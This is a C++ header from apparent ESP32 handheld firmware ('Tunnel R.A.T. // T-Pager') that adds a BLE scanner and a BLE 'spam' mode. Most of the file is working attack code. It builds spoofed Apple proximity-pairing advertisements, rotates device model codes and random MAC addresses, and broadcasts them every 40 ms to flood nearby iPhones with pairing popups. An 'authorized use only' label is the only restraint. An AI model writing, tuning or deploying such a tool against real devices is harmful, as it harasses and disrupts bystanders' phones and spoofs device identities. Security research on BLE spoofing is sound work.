// ===========================================================================
//  tr_ble.h  —  Tunnel R.A.T. // T-Pager  —  BLE tools
//  SCAN : list nearby BLE devices (MAC, name, RSSI).
//  SPAM : rotate Apple-proximity "pairing popup" adverts with random MACs.
//  AUTHORIZED / OWN-DEVICE testing only.
//
//  NimBLE-Arduino 2.x. Spam payloads are device/OS-version dependent, so the
//  popup behaviour may need payload tuning on real targets.
// ===========================================================================
#pragma once
#include "config.h"
#include <lvgl.h>
#include <NimBLEDevice.h>
#include "esp_random.h"

namespace ble {

enum BMode { B_IDLE, B_SCAN, B_SPAM };
static BMode s_mode=B_IDLE;
static bool  s_init=false;
static uint32_t s_seen=0, s_spam=0, s_lastSpam=0;

static lv_obj_t *s_lbl=nullptr, *s_list=nullptr;
static NimBLEScan *s_scan=nullptr;
static NimBLEAdvertising *s_adv=nullptr;

static void ensureInit(){ if(!s_init){ NimBLEDevice::init("TR"); s_init=true; } }

// ---- scan -----------------------------------------------------------------
class ScanCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice *d) override {
    if(!s_list) return;
    char row[84];
    snprintf(row,sizeof row,"%s  %-14.14s %ddBm",
      d->getAddress().toString().c_str(),
      d->haveName()? d->getName().c_str() : "(no name)", d->getRSSI());
    if(lv_obj_get_child_cnt(s_list)>40) lv_obj_del(lv_obj_get_child(s_list,0));
    lv_list_add_text(s_list,row);
    s_seen++;
  }
};
static ScanCB s_cb;

static void startScan(){
  ensureInit();
  if(s_adv) s_adv->stop();
  s_mode=B_SCAN; s_seen=0;
  if(s_list) lv_obj_clean(s_list);
  s_scan=NimBLEDevice::getScan();
  s_scan->setScanCallbacks(&s_cb,false);
  s_scan->setActiveScan(true); s_scan->setInterval(100); s_scan->setWindow(90);
  s_scan->start(0,false);
}

// ---- spam -----------------------------------------------------------------
static void randMac(uint8_t*m){ for(int i=0;i<6;i++) m[i]=esp_random()&0xFF; m[5]|=0xC0; }

static void spamTick(){
  // Apple proximity-pairing popups; rotate the device model code.
  static const uint16_t models[]={0x0220,0x0e20,0x0a20,0x0520,0x0320,0x1420,0x1020};
  static uint8_t mi=0;
  uint8_t mfr[27]; int n=0;
  mfr[n++]=0x4C; mfr[n++]=0x00;            // Apple company id
  mfr[n++]=0x07; mfr[n++]=0x19; mfr[n++]=0x07;
  mfr[n++]=models[mi]>>8; mfr[n++]=models[mi]&0xFF; mfr[n++]=0x55;
  while(n<27) mfr[n++]=esp_random()&0xFF;
  mi=(mi+1)%(sizeof(models)/sizeof(models[0]));

  uint8_t mac[6]; randMac(mac); NimBLEDevice::setOwnAddr(mac);
  s_adv->stop();
  s_adv->setManufacturerData(mfr, n);
  s_adv->start();
  s_spam++;
}

static void startSpam(){
  ensureInit();
  if(s_scan && s_scan->isScanning()) s_scan->stop();
  s_mode=B_SPAM;
  s_adv=NimBLEDevice::getAdvertising();
}

static void stopAll(){
  if(s_scan && s_scan->isScanning()) s_scan->stop();
  if(s_adv) s_adv->stop();
  s_mode=B_IDLE;
}

// ---- UI -------------------------------------------------------------------
static void mkBtn(lv_obj_t*p,const char*t,int x,int y,lv_event_cb_t cb){
  lv_obj_t*b=lv_btn_create(p); lv_obj_set_size(b,100,28);
  lv_obj_align(b,LV_ALIGN_TOP_LEFT,x,y); lv_obj_set_style_bg_color(b,lv_color_hex(0x15213A),0);
  lv_obj_t*l=lv_label_create(b); lv_label_set_text(l,t); lv_obj_center(l);
  lv_obj_add_event_cb(b,cb,LV_EVENT_CLICKED,NULL);
}

inline void buildUI(lv_obj_t *parent){
  s_lbl=lv_label_create(parent);
  lv_obj_set_style_text_color(s_lbl,lv_color_hex(0x40C4FF),0);
  lv_obj_set_width(s_lbl,lv_pct(96)); lv_obj_align(s_lbl,LV_ALIGN_TOP_LEFT,0,0);
  lv_label_set_text(s_lbl,"BLE tools — authorized use only");

  mkBtn(parent,"Scan",0,  22,[](lv_event_t*){ startScan(); });
  mkBtn(parent,"Spam",104,22,[](lv_event_t*){ startSpam(); });
  mkBtn(parent,"Stop",208,22,[](lv_event_t*){ stopAll(); });

  s_list=lv_list_create(parent);
  lv_obj_set_size(s_list,lv_pct(100),lv_pct(58));
  lv_obj_align(s_list,LV_ALIGN_BOTTOM_MID,0,0);
  lv_obj_set_style_bg_color(s_list,lv_color_hex(0x0E1016),0);
}

inline void loop(){
  if(s_mode==B_SPAM){
    uint32_t now=millis();
    if(now-s_lastSpam>=40){ s_lastSpam=now; spamTick(); }
    if(s_lbl) lv_label_set_text_fmt(s_lbl,"BLE SPAM — adverts sent: %u",(unsigned)s_spam);
  } else if(s_mode==B_SCAN){
    if(s_lbl) lv_label_set_text_fmt(s_lbl,"BLE SCAN — devices: %u",(unsigned)s_seen);
  }
}

inline void leave(){ stopAll(); }

} // namespace ble
